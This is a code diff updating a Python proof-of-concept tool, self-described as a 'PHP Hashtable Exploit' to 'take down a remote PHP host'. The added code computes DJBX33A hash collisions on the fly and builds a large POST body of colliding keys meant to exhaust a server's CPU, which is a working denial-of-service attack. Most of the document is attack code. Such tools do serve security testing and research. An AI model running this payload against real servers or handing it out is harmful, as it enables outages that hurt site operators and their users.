@@ -20,6 +20,7 @@ python HashtablePOC.py -u https://host/index.php -v -c 1 -w -o output -t PHP
 python HashtablePOC.py -u https://host/index.php -v -c 500 -t PHP
 
 Changelog:
+v4.0: Get PHP Collision Chars on the fly
 v3.0: Load Payload from file
 v2.0: Added Support for https, switched to HTTP 1.1
 v1.0: Initial Release
@@ -34,6 +35,8 @@ import time
 import urlparse
 import argparse
 import ssl
+import random
+import itertools
 
 def main():
     parser = argparse.ArgumentParser(description="Take down a remote PHP Host", prog="PHP Hashtable Exploit")
@@ -44,8 +47,8 @@ def main():
     parser.add_argument("-s", "--save", dest="save", help="Save payload to file")
     parser.add_argument("-p", "--payload", dest="payload", help="Save payload to file")
     parser.add_argument("-o", "--output", dest="output", help="Save Server response to file. This name is only a pattern. HTML Extension will be appended. Implies -w")
-    parser.add_argument("-t", "--target", dest="target", help="Target of the attack", choices=["ASP", "PHP"], required=True)
-    parser.add_argument("--version", action="version", version="%(prog)s 3.0")
+    parser.add_argument("-t", "--target", dest="target", help="Target of the attack", choices=["ASP", "PHP", "JAVA"], required=True)
+    parser.add_argument("--version", action="version", version="%(prog)s 4.0")
 
     options = parser.parse_args()
 
@@ -75,9 +78,15 @@ def main():
         if options.target == "PHP":
             payload = generatePHPPayload()
         elif options.target == "ASP":
-            payload = generateASPPayload()
+            #payload = generateASPPayload()
+            print("Target %s not yet implemented" % options.target)
+            sys.exit(1)
+        elif options.target == "JAVA":
+            #payload = generateJAVAPayload()
+            print("Target %s not yet implemented" % options.target)
+            sys.exit(1)
         else:
-            print("Unknown target %s" % options.target)
+            print("Target %s not yet implemented" % options.target)
             sys.exit(1)
 
         print("Payload generated")
@@ -170,30 +179,35 @@ Content-Length: %s\r\n\
 def generateASPPayload():
     return "a=a"
 
+def generateJAVAPayload():
+    return "b=b"
+
 def generatePHPPayload():
+    # Note: Default max POST Data Length in PHP is 8388608 bytes (8MB)
+    # compute entries with collisions in PHP hashtable hash function 
+    a = computePHPCollisionChars(5)
+    return _generatePayload(a, 7);
+    
+def _generatePayload(collisionchars, payloadlength):
     # Taken from:
     # https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision
 
-    # Note: Default max POST Data Length in PHP is 8388608 bytes (8MB)
-    
-    # entries with collisions in PHP hashtable hash function 
-    a = {"0":"Ez", "1":"FY", "2":"G8", "3":"H"+chr(23), "4":"D"+chr(122+33)}
     # how long should the payload be
-    length = 7
-    size = len(a)
+    length = payloadlength
+    size = len(collisionchars)
     post = ""
     maxvaluefloat = math.pow(size,length)
     maxvalueint = int(math.floor(maxvaluefloat))
     for i in range (maxvalueint):
-        inputstring = base_convert(i, size)
+        inputstring = _base_convert(i, size)
         result = inputstring.rjust(length, "0")
-        for item in a:
-            result = result.replace(item, a[item])
+        for item in collisionchars:
+            result = result.replace(str(item), collisionchars[item])
         post += "" + urllib.quote(result) + "=&"
 
     return post;
 
-def base_convert(num, base):
+def _base_convert(num, base):
     fullalphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
     alphabet = fullalphabet[:base]
     if (num == 0):
@@ -206,6 +220,57 @@ def base_convert(num, base):
         arr.append(alphabet[rem])
     arr.reverse()
     return "".join(arr)
+
+def computePHPCollisionChars(count):
+    hashes = {}
+    counter = 0
+    length = 2
+    a = ""
+    for i in range(1, 254):
+        a = a+chr(i)
+    source = list(itertools.product(a, repeat=length))
+    basestr = ''.join(random.choice(source))
+    basehash = _DJBX33A(basestr)
+    print("\tValue: %s\tHash: %s" % (basestr, basehash))
+    hashes[str(counter)] = basestr
+    counter = counter + 1
+    for item in source:
+        tempstr = ''.join(item)
+        if tempstr == basestr:
+            continue
+
+        temphash = _DJBX33A(tempstr) 
+        if temphash == basehash:
+            print("\tValue: %s\tHash: %s" % (tempstr, temphash))
+            hashes[str(counter)] = tempstr
+            counter = counter + 1
+        if counter >= count:
+            break;
+    if counter != count:
+        print("Not enough values found. Please start the script again")
+        sys.exit(1)
+    return hashes
+
+def _DJBX(inputstring, base, start):
+    counter = len(inputstring) - 1
+    result = start
+    for item in inputstring:
+        result = result + (math.pow(base, counter) * ord(item))
+        counter = counter - 1
+    return int(round(result))
+
+#PHP
+def _DJBX33A(inputstring):
+    return _DJBX(inputstring, 33, 5381)
+
+#ASP
+def _DJBX33X(inputstring):
+    counter = len(inputstring) - 1
+    result = 5381
+    for item in inputstring:
+        result = result + (int(round(math.pow(33, counter))) ^ ord(item))
+        counter = counter - 1
+    return int(round(result))
 
 if __name__ == "__main__":
     main()
